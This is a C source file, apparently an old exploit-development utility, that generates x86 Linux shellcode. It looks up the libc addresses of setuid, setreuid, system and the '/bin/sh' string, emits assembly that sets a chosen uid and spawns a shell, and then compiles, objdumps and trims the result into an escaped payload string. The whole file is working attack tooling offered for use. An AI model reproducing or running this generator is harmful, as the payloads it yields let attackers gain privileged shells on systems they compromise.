#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

#define	DIFF		0x4000
#define LIBC		"/lib/i686/libc.so.6"
#define SCSOURCE	"shellcode.c"
#define SCBINARY	"shellcode"
#define SCDUMP		"shellcodedump.txt"
#define BACKUP 		"backup.txt"
#define OBJDUMP		"/usr/bin/objdump"
#define GCC		"/usr/bin/gcc"
#define CAT		"/bin/cat"
#define GREP 		"/bin/grep"
#define AWK 		"/bin/awk"
#define CUT 		"/bin/cut"
#define PERL 		"/usr/bin/perl"
#define PERLFILE 	"extract"
#define CHMOD		"/bin/chmod"
#define RM		"/bin/rm"

int main(int argc, char **argv)
{
	FILE *fp;
	long shellStringAddress;
	char CMD[256], buffer[256], shellcodeBuffer[256];
	long systemVar, setuidVar, setreuidVar;
	void *handle;
	int i, reuidVar;

	if(argc < 2) {
		puts("\nThis program is shellcode generator on the LINUX on x86");
		puts("                                     Made by Saintlinu");
		puts("\nWARNING : USE AT YOUR OWN RISK!!!\n");
		printf("Usage : %s uid\n\n", argv[0]);
		exit(-1);
	}

	handle=dlopen(LIBC, RTLD_LAZY);
	setuidVar=(long)dlsym(handle,"setuid");
	dlclose(handle);

	handle=dlopen(LIBC, RTLD_LAZY);
	systemVar=(long)dlsym(handle,"system");
	dlclose(handle);

	handle=dlopen(LIBC, RTLD_LAZY);
	setreuidVar=(long)dlsym(handle,"setreuid");
	dlclose(handle);

	reuidVar=atoi(argv[1]);
	setuidVar -= DIFF;
	setreuidVar -= DIFF;
	systemVar -= DIFF;

	/* To open file descriptor */
	if((fp=fopen(SCSOURCE, "w")) < 0) {
		printf("File open error\n");
		exit(-1);
	}

	/* find strings /bin/sh in system() */
	shellStringAddress=systemVar;
	while((memcmp((void *)shellStringAddress, "/bin/sh", 8)))
		shellStringAddress++;	// if not equal then result is larger than 1

	shellStringAddress -= DIFF;

	/* To print about something */
	puts("\nThis program is shellcode generator on the LINUX on x86");
	puts("                                     Made by Saintlinu");
	puts("\nWARNING : USE AT YOUR OWN RISK!!!\n");
	puts("\n=================================================");
	puts("Calculating.....\n");
	printf("setuid() address is 0x%x\n", setuidVar);
	printf("setreuid() address is 0x%x\n", setreuidVar);
	printf("system() address is 0x%x\n", systemVar);
	printf("\n\"/bin/sh\" strings address is 0x%x\n", shellStringAddress);
	puts("=================================================\n");
	puts("Let's make a shellcode's binary ....\n");

	/* To write shellcode in assembly language to shellcode.c */
	if(reuidVar == 0) {
		fprintf(fp, "int main(int argc, char **argv)\n");
		fprintf(fp, "{\n");
		fprintf(fp, "	__asm__  (\"\n");
		fprintf(fp, "			 movl $0x%x, %s\n", shellStringAddress, "%eax");
		fprintf(fp, "			 push %s\n", "%eax");
		fprintf(fp, "			 xor %s, %s\n", "%eax", "%eax");
		fprintf(fp, "			 push %s\n", "%eax");
		fprintf(fp, "		         movl $0x%x, %s\n", systemVar, "%eax");
		fprintf(fp, "			 push %s\n", "%eax");
		fprintf(fp, "			 movl $0x%x, %s\n", setuidVar, "%eax");
		fprintf(fp, "			 push %s\n", "%eax");
		fprintf(fp, "		         ret\n");
		fprintf(fp, "		\");\n");
		fprintf(fp, "}\n");
		fclose(fp);
	} else {
		fprintf(fp, "int main(int argc, char **argv)\n");
		fprintf(fp, "{\n");
		fprintf(fp, "	__asm__ (\"\n");
		fprintf(fp, "			movw $0x%x, %s\n", reuidVar, "%ax");
		fprintf(fp, "			movw %s, %s\n", "%ax", "%bx");
		fprintf(fp, "			push %s\n", "%ax");
		fprintf(fp, "			push %s\n", "%bx");
		fprintf(fp, "			push $0x18\n");
		fprintf(fp, "			int  $0x80\n");
		fprintf(fp, "			movl $0x%x, %s\n", shellStringAddress, "%eax");
		fprintf(fp, "			push %s\n", "%eax");
		fprintf(fp, "			xor %s, %s\n", "%eax", "%eax");
		fprintf(fp, "			push %s\n", "%eax");
		fprintf(fp, "			movl $0x%x, %s\n", systemVar, "%eax");
		fprintf(fp, "			push %s\n", "%eax");
		fprintf(fp, "			movl $0x%x, %s\n", setuidVar, "%eax");
		fprintf(fp, "			push %s\n", "%eax");
		fprintf(fp, "			ret\n");
		fprintf(fp, "		\");\n");
		fprintf(fp, "}\n");
		fclose(fp);
	}

	/* To make executive shellcode's object file using a "gcc" */
	sprintf(CMD, "%s -o %s %s\n", GCC, SCBINARY, SCSOURCE);
	system(CMD);

	/* To make binary code with objdump */
	sprintf(CMD, "%s -d %s > %s\n", OBJDUMP, SCBINARY, SCDUMP);
	system(CMD);

	/* To trim shellcode's dumpfile */
	if(reuidVar == 0) {
		sprintf(CMD, "%s %s | %s -A 11 \"<main>\" > %s\n", CAT, SCDUMP, GREP, BACKUP);
		system(CMD);
	} else if(reuidVar != 0) {
		sprintf(CMD, "%s %s | %s -A 17 \"<main>\" > %s\n", CAT, SCDUMP, GREP, BACKUP);
		system(CMD);
	}


	/* To trim space from dumpfile and stuff */ 
	sprintf(CMD, "%s %s | %s -d: -f2 | %s -d\" \" -f1-5 | %s \'{ print $1 $2 $3 $4 $5 }\' > %s\n", CAT, BACKUP, CUT, CUT, AWK, SCDUMP);
	system(CMD);

	/* To make a PERL file */
	if((fp=fopen(PERLFILE, "w")) < 0) {
		printf("file write error\n");
		exit(-1);
	}
	fprintf(fp, "#!%s -w\n open(SCFILE, '%s') || die $!;while(<SCFILE>) { chop($_); $shellcode .= $_; } print $shellcode;\n", PERL, SCDUMP);
	fclose(fp);
	sprintf(CMD, "%s +x %s\n", CHMOD, PERLFILE);
	system(CMD);
	sprintf(CMD, "./%s > %s\n", PERLFILE, BACKUP);
	system(CMD);

	/* To modify final stuff */
	if((fp=fopen(BACKUP, "r")) < 0) {
		printf("file write error\n");
		exit(-1);
	}

	bzero(buffer, sizeof(buffer));
	for(i=0; i<sizeof(buffer); i+=4) {
		buffer[i]='\\';
		buffer[i+1]='x';
		buffer[i+2]=fgetc(fp);
		buffer[i+3]=fgetc(fp);
		if(!(isalnum(buffer[i+2])) && buffer[i+1] == 'x' && buffer[i] == '\\') {
			buffer[i]='\0';
			break;
		}
	}
	fclose(fp);

	/* To delete stuff files */
	sprintf(CMD, "%s -rf %s %s %s %s %s\n", RM, BACKUP, PERLFILE, SCSOURCE, SCBINARY, SCDUMP);
	system(CMD);


	/* To make shellcode file */
	if((fp=fopen(SCBINARY, "w")) < 0) {
		printf("file write error\n");
		exit(-1);
	}
	fprintf(fp, "%s\n", buffer);
	fclose(fp);

	puts("\nOkay Done..................\n");
	exit(0);
}
